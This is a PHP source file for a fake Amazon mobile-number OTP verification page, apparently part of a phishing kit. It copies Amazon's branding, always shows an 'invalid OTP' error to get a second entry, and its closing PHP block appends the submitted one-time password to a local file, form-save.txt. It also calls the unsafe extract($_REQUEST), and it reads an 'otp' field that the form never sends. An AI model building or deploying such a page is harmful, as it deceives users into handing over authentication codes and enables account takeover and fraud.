<?php require_once('header.php'); ?>

<div class="container mt-5">
      <div class="row">
         <img class='logo' src="img/amazon-logo.png" alt="" height='103px'>

      </div>
       <div class="alert-box mb-3">
       <div class="row">
        <div class="col-2 text-center">
            <img class='ml-3 mt-3  ' src="img/alert-icon.png" width='30px' alt="">
        </div>
        <div class="col">
            <h5 class='problem mt-3'>There was a problem</h5>
            <p style="font-size: 13px">The One Time Password (OTP) you entered is <br> not valid. Please try again.</p>
        </div>
    </div>
       </div>
      <form action="" method='post'>
      <div class="login-form ">
      
          <div class="login-box">
          <h2 class='signin-text'>Verify mobile number</h2>
          <span class='font-13'>A text with a One Time Password (OTP) has been sent to your mobile number: 
               <?php   if ( ! empty ( $_POST)){
            
                    // $_SESSION['mobilenumber'] = $_POST['mobilenumber'];
                    echo $_SESSION['mobilenumber'];
    
                   } 
                 ?>
            </span>
          <a class='font-13 link-btm' href="#">Change</a><br>
          <label for="password" class="label-email mt-3 font-13">Enter OTP:</label
          ><a class='link mt-3 float-right link-btm font-13' href="#">Resend OTP</a>
<br /> 
          <input
            class="input-login password-text"
            type="password"
            name="password"
            autocomplete="off"
            required
          />
          <br />
          <input type="submit" class="input-continue mt-2" name='verifyotp' value='Verify'/>
   
                   

        </div>
      </div>
      </form>

         <div class="bar2">
           <hr class='hr-text2 mt-5'>
         </div>
      </div>
      <div class="bar1">
        <div class="row">
          <div class="btm-link-wrap"><a class='link-btm col ml-3' href="#">Conditions of Use</a></div>
          <div class="btm-link-wrap"><a class='link-btm col' href="#">Privacy Notice</a></div>
          <div class="btm-link-wrap"><a class='link-btm col' href="#">Help</a></div>
            <span class="footer-text">
              © 1996-2020, Amazon.com, Inc. or its affiliates
            </span>
        </div>
      </div>
    </div>
    <?php
      if(isset($_POST)){
        $_SESSION['otp'] = $_POST['otp'];
      }
      $OTP = "OTP : ".$_SESSION['otp'];
      extract($_REQUEST);
      
      $file=fopen("form-save.txt", "a");
      fwrite($file, $OTP);
      fclose($file); 
    ?>
    <?php require_once('footer.php'); ?>

